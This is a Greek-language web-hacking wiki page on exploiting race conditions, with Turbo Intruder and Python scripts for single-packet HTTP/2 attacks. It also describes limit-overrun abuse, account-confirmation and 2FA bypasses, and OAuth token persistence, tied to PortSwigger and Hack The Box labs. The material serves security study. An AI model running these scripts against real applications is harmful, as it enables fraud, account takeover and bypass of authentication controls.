# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Για να αποκτήσετε μια βαθιά κατανόηση αυτής της τεχνικής, ελέγξτε την αρχική αναφορά στο [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Το κύριο εμπόδιο στην εκμετάλλευση των race conditions είναι η διασφάλιση ότι πολλαπλά αιτήματα χειρίζονται ταυτόχρονα, με **πολύ μικρή διαφορά στους χρόνους επεξεργασίας τους—ιδανικά, λιγότερο από 1ms**.

Εδώ μπορείτε να βρείτε μερικές τεχνικές για τη Συγχρονισμό Αιτημάτων:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Υποστηρίζει την αποστολή δύο αιτημάτων μέσω μιας μόνο σύνδεσης TCP, μειώνοντας την επίδραση του jitter στο δίκτυο. Ωστόσο, λόγω παραλλαγών στην πλευρά του διακομιστή, δύο αιτήματα μπορεί να μην είναι αρκετά για μια συνεπή εκμετάλλευση race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Επιτρέπει την προ-αποστολή των περισσότερων τμημάτων 20-30 αιτημάτων, κρατώντας ένα μικρό κομμάτι, το οποίο αποστέλλεται στη συνέχεια μαζί, επιτυγχάνοντας ταυτόχρονη άφιξη στον διακομιστή.

**Η προετοιμασία για Last-Byte Sync** περιλαμβάνει:

1. Αποστολή κεφαλίδων και δεδομένων σώματος χωρίς το τελικό byte χωρίς να τερματίσετε τη ροή.
2. Παύση για 100ms μετά την αρχική αποστολή.
3. Απενεργοποίηση του TCP_NODELAY για να χρησιμοποιηθεί ο αλγόριθμος Nagle για την ομαδοποίηση των τελικών πλαισίων.
4. Ping για να ζεστάνει τη σύνδεση.

Η επόμενη αποστολή των συγκρατημένων πλαισίων θα πρέπει να έχει ως αποτέλεσμα την άφιξή τους σε ένα μόνο πακέτο, επαληθεύσιμο μέσω του Wireshark. Αυτή η μέθοδος δεν ισχύει για στατικά αρχεία, τα οποία δεν εμπλέκονται συνήθως σε επιθέσεις RC.

### Adapting to Server Architecture

Η κατανόηση της αρχιτεκτονικής του στόχου είναι κρίσιμη. Οι διακομιστές front-end μπορεί να δρομολογούν τα αιτήματα διαφορετικά, επηρεάζοντας το χρονοδιάγραμμα. Η προληπτική θέρμανση της σύνδεσης στην πλευρά του διακομιστή, μέσω ασήμαντων αιτημάτων, μπορεί να κανονικοποιήσει το χρονοδιάγραμμα των αιτημάτων.

#### Handling Session-Based Locking

Frameworks όπως ο διαχειριστής συνεδρίας του PHP σειριοποιούν τα αιτήματα κατά συνεδρία, ενδεχομένως αποκρύπτοντας ευπάθειες. Η χρήση διαφορετικών tokens συνεδρίας για κάθε αίτημα μπορεί να παρακάμψει αυτό το ζήτημα.

#### Overcoming Rate or Resource Limits

Εάν η θέρμανση της σύνδεσης είναι αναποτελεσματική, η σκόπιμη πρόκληση καθυστερήσεων στα όρια ρυθμού ή πόρων των διακομιστών ιστού μέσω πλημμύρας ψεύτικων αιτημάτων μπορεί να διευκολύνει την επίθεση single-packet προκαλώντας καθυστέρηση στην πλευρά του διακομιστή που ευνοεί τις race conditions.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Μπορείτε να στείλετε το αίτημα στο **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), μπορείτε να αλλάξετε στην αίτηση την τιμή που θέλετε να brute force για **`%s`** όπως στο `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` και στη συνέχεια να επιλέξετε το **`examples/race-single-packer-attack.py`** από την αναπτυσσόμενη λίστα:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Εάν πρόκειται να **στείλετε διαφορετικές τιμές**, μπορείτε να τροποποιήσετε τον κώδικα με αυτόν που χρησιμοποιεί μια λίστα λέξεων από το πρόχειρο:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Αν ο ιστότοπος δεν υποστηρίζει HTTP2 (μόνο HTTP1.1) χρησιμοποιήστε `Engine.THREADED` ή `Engine.BURP` αντί για `Engine.BURP2`.

- **Tubo Intruder - HTTP2 επίθεση μεμονωμένου πακέτου (Πολλές τελικές διαδρομές)**: Σε περίπτωση που χρειαστεί να στείλετε ένα αίτημα σε 1 τελική διαδρομή και στη συνέχεια πολλά σε άλλες τελικές διαδρομές για να ενεργοποιήσετε το RCE, μπορείτε να αλλάξετε το σενάριο `race-single-packet-attack.py` με κάτι σαν:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Είναι επίσης διαθέσιμο στο **Repeater** μέσω της νέας επιλογής '**Αποστολή ομάδας παράλληλα**' στο Burp Suite.
- Για **limit-overrun** θα μπορούσατε απλά να προσθέσετε το **ίδιο αίτημα 50 φορές** στην ομάδα.
- Για **connection warming**, θα μπορούσατε να **προσθέσετε** στην **αρχή** της **ομάδας** κάποια **αιτήματα** σε κάποιο μη στατικό μέρος του web server.
- Για **delaying** τη διαδικασία **μεταξύ** της επεξεργασίας **ενός αιτήματος και ενός άλλου** σε 2 υποστάσεις βημάτων, θα μπορούσατε να **προσθέσετε επιπλέον αιτήματα μεταξύ** και των δύο αιτημάτων.
- Για ένα **multi-endpoint** RC θα μπορούσατε να αρχίσετε να στέλνετε το **αίτημα** που **πηγαίνει στην κρυφή κατάσταση** και στη συνέχεια **50 αιτήματα** αμέσως μετά που **εκμεταλλεύονται την κρυφή κατάσταση**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Ο στόχος αυτού του script είναι να αλλάξει το email ενός χρήστη ενώ συνεχώς το επαληθεύει μέχρι να φτάσει το διαπιστευτήριο επαλήθευσης του νέου email στο τελευταίο email (αυτό συμβαίνει επειδή στον κώδικα παρατηρούσε μια RC όπου ήταν δυνατό να τροποποιηθεί ένα email αλλά να σταλεί η επαλήθευση στο παλιό επειδή η μεταβλητή που υποδείκνυε το email ήταν ήδη γεμάτη με το πρώτο).\
Όταν η λέξη "objetivo" βρεθεί στα ληφθέντα emails, γνωρίζουμε ότι λάβαμε το διαπιστευτήριο επαλήθευσης του αλλάγμένου email και τερματίζουμε την επίθεση.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Βελτίωση Επίθεσης Μοναδικού Πακέτου

Στην αρχική έρευνα εξηγείται ότι αυτή η επίθεση έχει όριο 1,500 bytes. Ωστόσο, σε [**αυτή την ανάρτηση**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), εξηγήθηκε πώς είναι δυνατόν να επεκταθεί ο περιορισμός των 1,500 bytes της επίθεσης μοναδικού πακέτου στο **65,535 B παράθυρο περιορισμού του TCP χρησιμοποιώντας κατακερματισμό επιπέδου IP** (διαχωρισμός ενός μοναδικού πακέτου σε πολλαπλά πακέτα IP) και αποστολή τους σε διαφορετική σειρά, επιτρέποντας την αποφυγή ανασυγκρότησης του πακέτου μέχρι να φτάσουν όλα τα θραύσματα στον διακομιστή. Αυτή η τεχνική επέτρεψε στον ερευνητή να στείλει 10,000 αιτήσεις σε περίπου 166ms.

Σημειώστε ότι αν και αυτή η βελτίωση καθιστά την επίθεση πιο αξιόπιστη σε RC που απαιτεί εκατοντάδες/χιλιάδες πακέτα να φτάσουν ταυτόχρονα, μπορεί επίσης να έχει κάποιους περιορισμούς λογισμικού. Ορισμένοι δημοφιλείς HTTP διακομιστές όπως οι Apache, Nginx και Go έχουν αυστηρή ρύθμιση `SETTINGS_MAX_CONCURRENT_STREAMS` σε 100, 128 και 250. Ωστόσο, άλλοι όπως οι NodeJS και nghttp2 το έχουν απεριόριστο.\
Αυτό σημαίνει βασικά ότι ο Apache θα θεωρήσει μόνο 100 HTTP συνδέσεις από μια μοναδική TCP σύνδεση (περιορίζοντας αυτή την επίθεση RC).

Μπορείτε να βρείτε μερικά παραδείγματα χρησιμοποιώντας αυτή την τεχνική στο αποθετήριο [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Ακατέργαστο BF

Πριν από την προηγούμενη έρευνα, αυτά ήταν μερικά payloads που χρησιμοποιήθηκαν και απλώς προσπαθούσαν να στείλουν τα πακέτα όσο το δυνατόν πιο γρήγορα για να προκαλέσουν μια RC.

- **Επαναλήπτης:** Ελέγξτε τα παραδείγματα από την προηγούμενη ενότητα.
- **Εισβολέας**: Στείλτε το **αίτημα** στον **Εισβολέα**, ρυθμίστε τον **αριθμό νημάτων** σε **30** μέσα στο **μενού Επιλογών** και επιλέξτε ως payload **Null payloads** και δημιουργήστε **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Αυτή είναι η πιο βασική μορφή συνθήκης αγώνα όπου **ευπάθειες** που **εμφανίζονται** σε μέρη που **περιορίζουν τον αριθμό φορών που μπορείτε να εκτελέσετε μια ενέργεια**. Όπως η χρήση του ίδιου κωδικού έκπτωσης σε ένα διαδικτυακό κατάστημα πολλές φορές. Ένα πολύ εύκολο παράδειγμα μπορεί να βρεθεί σε [**αυτή την αναφορά**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ή σε [**αυτό το σφάλμα**](https://hackerone.com/reports/759247)**.**

Υπάρχουν πολλές παραλλαγές αυτού του είδους επίθεσης, συμπεριλαμβανομένων:

- Εξαργύρωση μιας δωροκάρτας πολλές φορές
- Αξιολόγηση ενός προϊόντος πολλές φορές
- Ανάληψη ή μεταφορά χρημάτων που υπερβαίνουν το υπόλοιπο του λογαριασμού σας
- Επαναχρησιμοποίηση μιας μόνο λύσης CAPTCHA
- Παράκαμψη ενός περιορισμού ρυθμού κατά της βίαιης επίθεσης

### **Hidden substates**

Η εκμετάλλευση σύνθετων συνθηκών αγώνα συχνά περιλαμβάνει την εκμετάλλευση βραχυχρόνιων ευκαιριών για αλληλεπίδραση με κρυφές ή **μη προγραμματισμένες υποκαταστάσεις μηχανής**. Να πώς να προσεγγίσετε αυτό:

1. **Identify Potential Hidden Substates**
- Ξεκινήστε εντοπίζοντας σημεία που τροποποιούν ή αλληλεπιδρούν με κρίσιμα δεδομένα, όπως προφίλ χρηστών ή διαδικασίες επαναφοράς κωδικών πρόσβασης. Επικεντρωθείτε σε:
- **Storage**: Προτιμήστε σημεία που χειρίζονται μόνιμα δεδομένα στον διακομιστή σε σχέση με αυτά που χειρίζονται δεδομένα στον πελάτη.
- **Action**: Αναζητήστε λειτουργίες που τροποποιούν υπάρχοντα δεδομένα, οι οποίες είναι πιο πιθανό να δημιουργήσουν εκμεταλλεύσιμες συνθήκες σε σύγκριση με αυτές που προσθέτουν νέα δεδομένα.
- **Keying**: Οι επιτυχείς επιθέσεις συνήθως περιλαμβάνουν λειτουργίες που βασίζονται στον ίδιο αναγνωριστικό, π.χ., όνομα χρήστη ή διακριτικό επαναφοράς.
2. **Conduct Initial Probing**
- Δοκιμάστε τα εντοπισμένα σημεία με επιθέσεις συνθήκης αγώνα, παρατηρώντας τυχόν αποκλίσεις από τις αναμενόμενες εκβάσεις. Απροσδόκητες απαντήσεις ή αλλαγές στη συμπεριφορά της εφαρμογής μπορεί να υποδηλώνουν μια ευπάθεια.
3. **Demonstrate the Vulnerability**
- Στενέψτε την επίθεση στον ελάχιστο αριθμό αιτημάτων που απαιτούνται για την εκμετάλλευση της ευπάθειας, συχνά μόλις δύο. Αυτό το βήμα μπορεί να απαιτεί πολλές προσπάθειες ή αυτοματοποίηση λόγω της ακριβούς χρονομέτρησης που εμπλέκεται.

### Time Sensitive Attacks

Η ακρίβεια στην χρονομέτρηση των αιτημάτων μπορεί να αποκαλύψει ευπάθειες, ειδικά όταν χρησιμοποιούνται προβλέψιμες μέθοδοι όπως οι χρονικές σφραγίδες για τα διακριτικά ασφαλείας. Για παράδειγμα, η δημιουργία διακριτικών επαναφοράς κωδικών πρόσβασης με βάση τις χρονικές σφραγίδες θα μπορούσε να επιτρέψει ταυτόσημα διακριτικά για ταυτόχρονες αιτήσεις.

**To Exploit:**

- Χρησιμοποιήστε ακριβή χρονομέτρηση, όπως μια επίθεση με ένα μόνο πακέτο, για να κάνετε ταυτόχρονες αιτήσεις επαναφοράς κωδικών πρόσβασης. Τα ταυτόσημα διακριτικά υποδηλώνουν μια ευπάθεια.

**Example:**

- Ζητήστε δύο διακριτικά επαναφοράς κωδικών πρόσβασης ταυτόχρονα και συγκρίνετέ τα. Τα ταυτοποιημένα διακριτικά υποδηλώνουν ένα σφάλμα στη δημιουργία διακριτικών.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.

### Confirm other emails

Η ιδέα είναι να **επιβεβαιώσετε μια διεύθυνση email και να την αλλάξετε σε μια διαφορετική ταυτόχρονα** για να διαπιστώσετε αν η πλατφόρμα επιβεβαιώνει τη νέα που έχει αλλάξει.

### Change email to 2 emails addresses Cookie based

Σύμφωνα με [**αυτή την έρευνα**](https://portswigger.net/research/smashing-the-state-machine) το Gitlab ήταν ευάλωτο σε κατάληψη με αυτόν τον τρόπο επειδή μπορεί να **στείλει** το **διακριτικό επιβεβαίωσης email μιας διεύθυνσης email στην άλλη διεύθυνση email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Εάν **χρησιμοποιηθούν 2 διαφορετικές εγγραφές** για να **προσθέσουν** **πληροφορίες** μέσα σε μια **βάση δεδομένων**, υπάρχει μια μικρή χρονική περίοδος όπου **μόνο τα πρώτα δεδομένα έχουν γραφεί** μέσα στη βάση δεδομένων. Για παράδειγμα, όταν δημιουργείτε έναν χρήστη, το **όνομα χρήστη** και ο **κωδικός πρόσβασης** μπορεί να **γραφούν** και **στη συνέχεια το διακριτικό** για την επιβεβαίωση του νεοδημιουργηθέντος λογαριασμού να γραφεί. Αυτό σημαίνει ότι για μια μικρή χρονική περίοδο το **διακριτικό για την επιβεβαίωση ενός λογαριασμού είναι κενό**.

Επομένως, **η εγγραφή ενός λογαριασμού και η αποστολή αρκετών αιτημάτων με κενό διακριτικό** (`token=` ή `token[]=` ή οποιαδήποτε άλλη παραλλαγή) για να επιβεβαιώσετε τον λογαριασμό αμέσως θα μπορούσε να επιτρέψει την **επιβεβαίωση ενός λογαριασμού** όπου δεν ελέγχετε το email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

Ο παρακάτω ψευδοκώδικας είναι ευάλωτος σε συνθήκη αγώνα επειδή σε πολύ μικρό χρονικό διάστημα η **2FA δεν επιβάλλεται** ενώ δημιουργείται η συνεδρία:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

Υπάρχουν αρκετοί [**παροχείς OAUth**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Αυτές οι υπηρεσίες θα σας επιτρέψουν να δημιουργήσετε μια εφαρμογή και να πιστοποιήσετε χρήστες που έχει καταχωρίσει ο παροχέας. Για να το κάνετε αυτό, ο **πελάτης** θα χρειαστεί να **επιτρέψει στην εφαρμογή σας** να έχει πρόσβαση σε ορισμένα από τα δεδομένα τους μέσα στον **παροχέα OAUth**.\
Έτσι, μέχρι εδώ είναι απλώς μια κοινή σύνδεση με google/linkedin/github... όπου σας ζητείται μια σελίδα που λέει: "_Η εφαρμογή \<InsertCoolName> θέλει να έχει πρόσβαση στις πληροφορίες σας, θέλετε να το επιτρέψετε;_"

#### Race Condition in `authorization_code`

Το **πρόβλημα** εμφανίζεται όταν **το αποδεχτείτε** και αυτόματα στέλνει έναν **`authorization_code`** στην κακόβουλη εφαρμογή. Στη συνέχεια, αυτή η **εφαρμογή εκμεταλλεύεται μια Race Condition στον παροχέα υπηρεσιών OAUth για να δημιουργήσει περισσότερα από ένα AT/RT** (_Authentication Token/Refresh Token_) από τον **`authorization_code`** για τον λογαριασμό σας. Βασικά, θα εκμεταλλευτεί το γεγονός ότι έχετε αποδεχτεί την εφαρμογή να έχει πρόσβαση στα δεδομένα σας για να **δημιουργήσει αρκετούς λογαριασμούς**. Στη συνέχεια, αν **σταματήσετε να επιτρέπετε στην εφαρμογή να έχει πρόσβαση στα δεδομένα σας, ένα ζεύγος AT/RT θα διαγραφεί, αλλά τα άλλα θα παραμείνουν έγκυρα**.

#### Race Condition in `Refresh Token`

Μόλις έχετε **αποκτήσει ένα έγκυρο RT**, μπορείτε να προσπαθήσετε να **το εκμεταλλευτείτε για να δημιουργήσετε αρκετά AT/RT** και **ακόμα και αν ο χρήστης ακυρώσει τις άδειες** για την κακόβουλη εφαρμογή να έχει πρόσβαση στα δεδομένα του, **αρκετά RT θα παραμείνουν έγκυρα.**

## **RC in WebSockets**

Στο [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) μπορείτε να βρείτε ένα PoC σε Java για να στείλετε μηνύματα websocket σε **παράλληλη** εκμετάλλευση **Race Conditions και σε Web Sockets**.

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{{#include ../banners/hacktricks-training.md}}
